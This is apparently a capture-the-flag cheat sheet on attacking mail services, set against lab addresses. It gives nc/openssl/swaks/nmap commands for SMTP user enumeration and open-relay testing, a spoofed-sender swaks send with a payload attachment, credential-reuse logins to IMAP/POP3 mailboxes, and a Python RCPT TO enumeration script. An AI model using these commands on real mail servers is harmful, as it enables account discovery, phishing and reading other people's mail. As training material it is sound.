---
title: "Mail Services - SMTP User Enumeration, Open Relay, IMAP and POP3"
category: misc
subcategory: network-services
type: technique
tags: [smtp, imap, pop3, swaks, smtp-user-enum, open-relay, vrfy, rcpt-to, openssl, mail, user-enumeration, network-services, enumeration]
difficulty: easy
summary: "SMTP VRFY/RCPT enumerate valid users, open relays let you send anywhere, and IMAP/POP3 with found creds hand over mailboxes full of secrets."
when_to_use:
  - "Ports 25/465/587 (SMTP), 143/993 (IMAP) or 110/995 (POP3) are open"
  - "You need to turn a wordlist into a list of valid local users"
  - "You have credentials and want to read a mailbox for the next flag/secret"
  - "You want to test whether the server is an open relay or accepts crafted mail"
tools: [swaks, smtp-user-enum, openssl, netcat, nmap]
related: [svc-default-credentials, net-scanning-fingerprinting, net-content-discovery]
---

## TL;DR

SMTP leaks valid usernames through `VRFY`/`EXPN`/`RCPT TO`. An open relay lets you send mail to
arbitrary recipients. IMAP/POP3 with a recovered credential give you the mailbox, which on CTF
boxes routinely contains the next password, an attachment, or the flag.

## Recognise it

- `25/tcp smtp`, `587/tcp submission`, `465/tcp smtps`, `143/tcp imap`, `993/tcp imaps`,
  `110/tcp pop3`, `995/tcp pop3s`.
- The SMTP banner names the MTA (Postfix, Exim, Sendmail) and hostname.

## Attack

### SMTP banner and capabilities

```bash
# Banner then capability list
nc -nv 10.10.10.5 25
# then type:  EHLO attacker.ctf

# One-shot with openssl for a TLS submission port
openssl s_client -connect 10.10.10.5:465 -quiet

# STARTTLS on 587/25
openssl s_client -connect 10.10.10.5:587 -starttls smtp
```

### SMTP user enumeration

```bash
# VRFY: ask whether a user exists
nc -nv 10.10.10.5 25 <<'EOF'
HELO attacker.ctf
VRFY root
VRFY admin
VRFY nonexistentuser123
QUIT
EOF

# EXPN: expand a mailing list / alias
# RCPT TO: the most reliable -- accepted recipient = valid user
nc -nv 10.10.10.5 25 <<'EOF'
HELO attacker.ctf
MAIL FROM:<probe@attacker.ctf>
RCPT TO:<jdoe@target.ctf>
RCPT TO:<nouser@target.ctf>
QUIT
EOF

# Automated with smtp-user-enum (VRFY, EXPN or RCPT mode)
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.5
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.5

# nmap NSE
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,RCPT} 10.10.10.5
```

Differentiate responses: `250`/`252` (accepted) vs `550`/`551` (unknown) tells valid from invalid.

### Open relay test

```bash
# nmap open-relay check
nmap -p25 --script smtp-open-relay 10.10.10.5

# Manual: relay to an EXTERNAL domain -- acceptance means open relay
nc -nv 10.10.10.5 25 <<'EOF'
HELO attacker.ctf
MAIL FROM:<test@attacker.ctf>
RCPT TO:<victim@external-domain.com>
DATA
Subject: relay test

relay body
.
QUIT
EOF
```

If `RCPT TO` for an external domain is accepted (250), it is an open relay.

### Sending mail with swaks

```bash
# Basic send
swaks --to jdoe@target.ctf --from attacker@evil.ctf --server 10.10.10.5 \
  --header 'Subject: hi' --body 'hello'

# With an attachment (phishing-style in CTF)
swaks --to jdoe@target.ctf --from admin@target.ctf --server 10.10.10.5 \
  --header 'Subject: report' --body 'see attached' --attach @payload.doc

# Authenticated submission over TLS
swaks --to jdoe@target.ctf --from svc@target.ctf --server 10.10.10.5:587 -tls \
  --auth LOGIN --auth-user svc@target.ctf --auth-password 'Summer2024!'

# Inject a header (test for header injection / spoofing)
swaks --to jdoe@target.ctf --from 'a@b.c' --server 10.10.10.5 \
  --header 'Subject: x' --add-header 'X-Injected: test'
```

### IMAP (143 / 993)

```bash
# Plaintext IMAP transcript
nc -nv 10.10.10.5 143 <<'EOF'
a LOGIN jdoe Summer2024!
a LIST "" "*"
a SELECT INBOX
a FETCH 1:* (BODY[])
a LOGOUT
EOF

# TLS IMAP
openssl s_client -connect 10.10.10.5:993 -quiet
# then: a LOGIN jdoe Summer2024!  /  a SELECT INBOX  /  a FETCH 1 (BODY[])
```

### POP3 (110 / 995)

```bash
# Plaintext POP3
nc -nv 10.10.10.5 110 <<'EOF'
USER jdoe
PASS Summer2024!
LIST
RETR 1
QUIT
EOF

# TLS POP3
openssl s_client -connect 10.10.10.5:995 -quiet
# then: USER jdoe  /  PASS Summer2024!  /  LIST  /  RETR 1
```

### Recon and offline mail

```bash
# MX records to find the mail host
dig MX target.ctf @10.10.10.5 +short

# Read a captured .eml / mbox for headers and attachments
cat message.eml | less
# Decode a base64 attachment segment
grep -A1000 'Content-Transfer-Encoding: base64' message.eml | sed -n '/^$/,/^--/p' | base64 -d > attachment.bin
```

## Code

SMTP user-enumeration helper using RCPT TO (the most reliable method), classifying each response.

```python
#!/usr/bin/env python3
"""Enumerate valid SMTP users via RCPT TO response codes.

Usage:
    python3 smtp_enum.py 10.10.10.5 target.ctf users.txt
"""
from __future__ import annotations

import smtplib
import sys


def check_user(host: str, domain: str, user: str) -> tuple[str, int]:
    """Return (user, rcpt_response_code) using a fresh SMTP conversation."""
    try:
        with smtplib.SMTP(host, 25, timeout=8) as smtp:
            smtp.helo("attacker.ctf")
            smtp.mail("probe@attacker.ctf")
            code, _ = smtp.rcpt(f"{user}@{domain}")
            return user, code
    except (smtplib.SMTPException, OSError):
        return user, -1


def main(argv: list[str]) -> int:
    if len(argv) != 4:
        print(__doc__)
        return 1
    host, domain, wordlist = argv[1], argv[2], argv[3]
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as fh:
        users = [u.strip() for u in fh if u.strip() and not u.startswith("#")]

    valid: list[str] = []
    for user in users:
        name, code = check_user(host, domain, user)
        # 250/251 accepted => valid; 550/551/553 => unknown; others => inconclusive
        if code in (250, 251):
            print(f"[+] VALID   {name} (code {code})")
            valid.append(name)
        elif code in (550, 551, 553):
            pass  # unknown user, stay quiet
        elif code == -1:
            print(f"[-] error probing {name}", file=sys.stderr)
    print(f"\n[*] {len(valid)} valid user(s): {', '.join(valid)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **VRFY/EXPN are often disabled**; `RCPT TO` almost always works and is the reliable method.
- **Greylisting/tarpitting** slows enumeration and can produce temporary `4xx` codes -- retry.
- **Rate limits.** MTAs may drop the connection after N invalid RCPTs; reconnect per user (the
  script above does).
- **Open relay to external domains only** -- accepting mail *for its own domain* is normal, not a relay.
- **TLS-only ports** (465, 993, 995) need `openssl s_client`; plain `nc` will not negotiate.
- **Reuse creds.** A password found elsewhere very often unlocks the mailbox; always try SMTP/IMAP
  auth with every credential you recover.
- **Attachments** in CTF mail are frequently the payload -- always decode and inspect them.

## Tools

- `swaks` -- the swiss-army SMTP client (send, auth, attach, inject).
- `smtp-user-enum` -- automated VRFY/EXPN/RCPT enumeration.
- `openssl s_client`, `nc` -- manual protocol transcripts.
- `nmap` NSE: `smtp-enum-users`, `smtp-open-relay`, `smtp-commands`, `imap-capabilities`,
  `pop3-capabilities`.

## References

- RFC 5321 (SMTP), RFC 3501 (IMAP4rev1), RFC 1939 (POP3).
- The swaks manual for the full option set.
